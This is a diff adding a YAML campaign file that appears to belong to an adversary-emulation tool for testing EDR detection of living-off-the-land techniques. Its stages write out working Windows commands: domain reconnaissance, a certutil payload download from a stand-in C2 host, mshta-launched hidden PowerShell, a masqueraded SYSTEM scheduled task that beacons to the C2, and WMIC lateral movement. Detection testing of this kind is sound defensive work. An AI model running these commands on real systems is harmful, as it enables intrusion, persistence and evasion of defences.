@@ -1,0 +1,111 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: living-off-the-land
+  adversary: volt-typhoon
+  description: "Living-off-the-land (LOTL) attack — use only built-in OS tools and signed binaries (LOLBins) for reconnaissance, persistence, and lateral movement to evade EDR."
+  objective: "Validate detection of LOTL techniques where no custom malware is dropped — all activity uses native OS binaries."
+  mitre_version: "15.1"
+  severity: high
+  tags: [lotl, lolbins, fileless, edr-evasion, native-tools]
+  authors: ["ThreatEcho"]
+  created: "2024-08-20"
+  modified: "2025-02-15"
+
+variables:
+  target_host: "10.0.2.50"
+  c2_url: "https://legitimate-looking-cdn.example.com/updates"
+
+stages:
+  - id: recon-native
+    name: Native Tool Reconnaissance
+    technique: T1018
+    tactic: discovery
+    description: "Enumerate network, users, and system info using only native Windows tools."
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          systeminfo > C:\Temp\si.txt
+          net user /domain >> C:\Temp\si.txt
+          net group "Domain Admins" /domain >> C:\Temp\si.txt
+          nltest /dclist:corp.example.com >> C:\Temp\si.txt
+          arp -a >> C:\Temp\si.txt
+          netstat -ano >> C:\Temp\si.txt
+        executor: cmd
+    expect:
+      telemetry: [process_creation, command_line]
+      detections: [reconnaissance_burst, native_tool_enumeration, command_sequence_anomaly]
+    on_failure: continue
+
+  - id: certutil-download
+    name: CertUtil Payload Download
+    technique: T1105
+    tactic: command-and-control
+    description: "Use certutil.exe (a signed Windows binary) to download a payload, bypassing application whitelisting."
+    depends_on: [recon-native]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: "certutil.exe -urlcache -split -f {{c2_url}}/payload.b64 C:\\Temp\\payload.b64 && certutil.exe -decode C:\\Temp\\payload.b64 C:\\Temp\\update.dll"
+        executor: cmd
+    expect:
+      telemetry: [process_creation, network_connection, file_write]
+      detections: [certutil_download, lolbin_file_download, base64_decode_execution]
+    on_failure: continue
+
+  - id: mshta-execution
+    name: MSHTA Script Execution
+    technique: T1218.005
+    tactic: defense-evasion
+    description: "Use mshta.exe to execute a script payload via an HTA application, bypassing script execution policies."
+    depends_on: [certutil-download]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -w hidden -c IEX(gc C:\\Temp\\update.dll)\"\", 0:close\")"
+        executor: cmd
+    expect:
+      telemetry: [process_creation, command_line, script_block_log]
+      detections: [mshta_script_execution, lolbin_proxy_execution, script_execution_via_hta]
+    on_failure: continue
+
+  - id: scheduled-task-persistence
+    name: Scheduled Task Persistence
+    technique: T1053.005
+    tactic: persistence
+    description: "Create a scheduled task for persistence using only native schtasks.exe."
+    depends_on: [mshta-execution]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: "schtasks /create /tn \"\\Microsoft\\Windows\\Maintenance\\SystemHealth\" /tr \"mshta.exe {{c2_url}}/beacon.hta\" /sc daily /st 09:00 /ru SYSTEM"
+        executor: cmd
+        elevation: required
+    expect:
+      telemetry: [process_creation, scheduled_task_creation, command_line]
+      detections: [suspicious_scheduled_task, masqueraded_task_name, mshta_in_scheduled_task]
+    on_failure: continue
+
+  - id: wmic-lateral
+    name: WMI Lateral Movement
+    technique: T1047
+    tactic: lateral-movement
+    description: "Use WMIC for lateral movement to a remote host — no custom tools, no malware dropped."
+    depends_on: [scheduled-task-persistence]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: "wmic /node:{{target_host}} process call create \"cmd.exe /c certutil.exe -urlcache -split -f {{c2_url}}/payload.b64 C:\\Temp\\payload.b64\""
+        executor: cmd
+        elevation: required
+    expect:
+      telemetry: [process_creation, wmi_event, network_connection]
+      detections: [wmi_remote_execution, lateral_lolbin_chain, remote_certutil_download]
+    on_failure: continue
